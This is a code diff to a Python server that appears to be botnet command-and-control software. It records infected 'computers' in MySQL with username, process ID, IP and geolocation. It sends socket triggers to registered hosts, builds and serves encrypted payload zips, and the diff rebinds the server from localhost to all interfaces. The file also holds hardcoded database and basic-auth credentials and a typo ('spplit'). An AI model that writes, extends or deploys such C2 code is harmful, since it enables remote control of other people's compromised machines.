@@ -1,3 +1,4 @@
+
 import mysql.connector
 from ast import literal_eval
 import socketserver
@@ -29,7 +30,7 @@ class Encryptor:
         BS = AES.block_size
         pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
 
-        raw = base64.b64encode(pad(raw).encode('utf8'))
+        raw = base64.b64encode(pad(raw).encode('ascii'))
         iv = get_random_bytes(AES.block_size)
         cipher = AES.new(key=self.__key__, mode= AES.MODE_CFB,iv= iv)
         return base64.b64encode(iv + cipher.encrypt(raw))
@@ -37,18 +38,21 @@ class Encryptor:
     def encrypt(self, fn):
         with open(fn, "r") as f:
             data = f.read()
-        with open(fn, "wb") as f:
-            f.write(self.__encrypt(data))
+        with open(fn, "w") as f:
+            f.write(self.__encrypt(data).decode())
 
 # ------------------------Encryption END----------------
 
 
-mydb = mysql.connector.connect(
-    host="localhost",
-    user="",
-    password="",
-    database="net"
-)
+config = {
+    "host": "localhost",
+    "user": "worker",
+    "password": "forwh4t_subnet",
+    "database": "net"
+    # auth_plugin='mysql_native_password'
+}
+
+mydb = mysql.connector.connect(**config)
 
 def connect(ip_s):
     s_r = socket.socket(2, 1)
@@ -88,6 +92,7 @@ class Server(BaseHTTPRequestHandler):
         creds = 'user:pass'.encode()
         creds1 = 'user:pas'.encode()
         ping_creds = 'ping:credentials'.encode()
+        # print("do_POST")
 
         if self.headers.get('Authorization').split()[1] == str(base64.b64encode(ping_creds))[2:-1]:
             # self.wfile.write(b"JK")
@@ -103,7 +108,7 @@ class Server(BaseHTTPRequestHandler):
             data = str(self.rfile.read( int(self.headers.get('content-length')) ))[2:-1]
             data = data.split("&")
             port = int(data[0].split("=")[-1])
-            
+
             if port == 8081:
                 dt = []
                 for i in range(len(data)):
@@ -126,7 +131,7 @@ class Server(BaseHTTPRequestHandler):
                 alias = data[1].spplit("=")[1]
                 ip_s = data[2].split("=")[1]
                 
-                
+                mydb = mysql.connector.connect(**config)
                 mycursor = mydb.cursor()
                 sql = "SELECT ip FROM computers where alias=%s;"
                 val = [alias]
@@ -136,7 +141,8 @@ class Server(BaseHTTPRequestHandler):
                 s = socket.socket(2, 1)
                 s.connect((ip_c, 9099))
                 del s
-                
+                mycursor.close()
+                mydb.close()
                 connect(ip_s)
 
             if port == 3214:
@@ -147,9 +153,9 @@ class Server(BaseHTTPRequestHandler):
                     self.end_headers()
                     # self.wfile.write(data.encode("utf-8"))
                     # self.wfile.close()
-                    
+                    mydb = mysql.connector.connect(**config)
                     mycursor = mydb.cursor()
-                    mycursor.execute("SELECT * FROM computers")
+                    mycursor.execute("SELECT * FROM computers;")
                     myresult = mycursor.fetchall()
                     myresult = str(myresult).encode()
                     # print(myresult)
@@ -163,10 +169,13 @@ class Server(BaseHTTPRequestHandler):
                     mycursor = mydb.cursor()
                     sql = "SELECT * FROM computers where alias=%s;"
                     val = [alias]
+                    mydb = mysql.connector.connect(**config)
                     mycursor.execute(sql, val)
                     myresult = mycursor.fetchall()
                     myresult = str(myresult).encode()
                     # print(myresult)
+                    mycursor.close()
+                    mydb.close()
                     self.wfile.write(myresult)
                     
                     
@@ -192,20 +201,41 @@ class Server(BaseHTTPRequestHandler):
                 alias = req_head.get('alias')
                 status = req_head.get('status')
 		
+                # print(user)
+
                 del req_head
 		
                 if status == "register":
-                    sql = "INSERT INTO computers (alias, username, pid, ip, geo) VALUES (%s, %s, %s, %s, %s);"
-                    val = (alias, user, pid, client_ip, geo)
+                    sql = "select * from computers where ip=%s;";
+                    val = [client_ip]
+                    mydb = mysql.connector.connect(**config)
+                    mycursor = mydb.cursor()
+                    mycursor.execute(sql, val)
+                    myresult = mycursor.fetchall()
+                    mycursor.close()
+                    mydb.close()
+
+                    if myresult != []:
+                        # print(myresult)
+                        sql = "update computers set alias=%s, username=%s, pid=%s, ip=%s, geo=%s where ip=%s or username=%s;"
+                        val = (alias, user, pid, client_ip, geo, client_ip, user)
+
+                    else:
+                        # print(alias)
+                        sql = "INSERT INTO computers (alias, username, pid, ip, geo) VALUES (%s, %s, %s, %s, %s);"
+                        val = (alias, user, pid, client_ip, geo)
 
                 elif status == "update":
-                    sql = "update computers set username='%s', pid=%s, ip='%s', geo='%s' where alias='%s';"
+                    sql = "update computers set username=%s, pid=%s, ip=%s, geo=%s where alias=%s;"
                     val = (user, pid, client_ip, geo, alias)
- 
+                
+                mydb = mysql.connector.connect(**config)
                 mycursor = mydb.cursor()
                 mycursor.execute(sql, val)
                 mydb.commit()
-            
+                mycursor.close()
+                # print("success")
+                mydb.close()
 
                 self.send_response(200)
                 self.end_headers()
@@ -217,20 +247,24 @@ class Server(BaseHTTPRequestHandler):
 
                 status = data[1].split("=")[1]
                 key = unquote(data[2].split("=")[1])
+                print(key)
                 key = base64.b64decode(bytes(key, "utf-8"))
                 
-                
+
                 if status == "update":
                     print(os.getenv("update"))
                 elif status == "get":
                     name = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
                     
                     subprocess.getoutput("cp -r tmp_up " + name)
+                    # try:
                     folder_encrypt(name, key)
                     subprocess.getoutput(f"zip -r {name}.zip {name}")
                     with open(name + ".zip", "rb") as f:
                         self.wfile.write(f.read())
-                        
+                    # except Exception as e:
+                    #     print(e)
+
                     subprocess.getoutput(f"rm -rf {name} {name}.zip")
                     
                     
@@ -244,7 +278,7 @@ class Server(BaseHTTPRequestHandler):
 
 host = socket.getaddrinfo(socket.gethostname(), None)
 ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
-bot_serv_addr = ("127.0.0.1", 65000)
+bot_serv_addr = ("0.0.0.0", 65000)
 print(bot_serv_addr)
 
 httpd = socketserver.TCPServer(bot_serv_addr, Server)
